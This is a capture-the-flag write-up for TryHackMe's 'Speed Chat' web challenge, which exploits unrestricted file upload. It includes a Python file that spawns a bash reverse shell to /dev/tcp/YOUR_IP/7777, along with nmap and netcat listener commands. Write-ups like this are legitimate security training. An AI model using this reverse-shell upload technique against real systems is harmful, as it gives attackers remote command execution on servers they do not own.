---
title: "Speed Chat"
date: 2026-02-17
categories:
  - THM_Love_at_First_Breach_2026
tags:
  - "Web"
  - "2026"
platform: THM Love at First Breach 2026
competition_year: 2026
toc: true
toc_sticky: true
---

# 🌐 Love at First Breach 2026 - Speed Chat

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web         |TryHackMe      |

## Challenge Prompt
My Dearest Hacker,

Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: `http://MACHINE_IP:5000`


## Problem Type
- Unrestricted File Upload

## Solve
When we visit the website, we get a chat window and profile window. I started off with sending a chat to see if there would be a response, but there wasn't.
<img width="1319" height="765" alt="2026-02-14_21-34-20" src="https://github.com/user-attachments/assets/5ebdfded-fee8-4a43-8ab2-fc70f00cca6d" />


It appears we can upload a file. Let's run a quick nmap scan to see what language the site is running. I used `nmap -p 5000 -T4 -A SITE_IP`:
<img width="1346" height="403" alt="2026-02-14_21-54-15" src="https://github.com/user-attachments/assets/f73b924e-f6bd-4b55-a920-f8c196c8c60b" />


Looks like this is running in Python, so let's try a Python reverse shell. We will do a really simple one that calls a bash reverse shell from [Payloads All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp):
```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/7777 0>&1'")
```
Save this file as `exploit.py`.

Then you can start a netcat listener on your machine using `nc -nvlp 7777` in the terminal. 

On the website, click `Choose File` and pick your `exploit.py` file. Then click `Upload`. When you return to your termial you should have access.<br>
<img width="635" height="164" alt="2026-02-14_22-04-27" src="https://github.com/user-attachments/assets/f82234b6-e96d-4255-bbb5-8b36da4637ad" />


Then you can run
`ls -la`

There you will see the `flag.txt` file which you can `cat` out to the screen:
<img width="837" height="332" alt="2026-02-14_22-05-35" src="https://github.com/user-attachments/assets/32af466e-ad43-4f7f-8965-2227e0069ee9" />

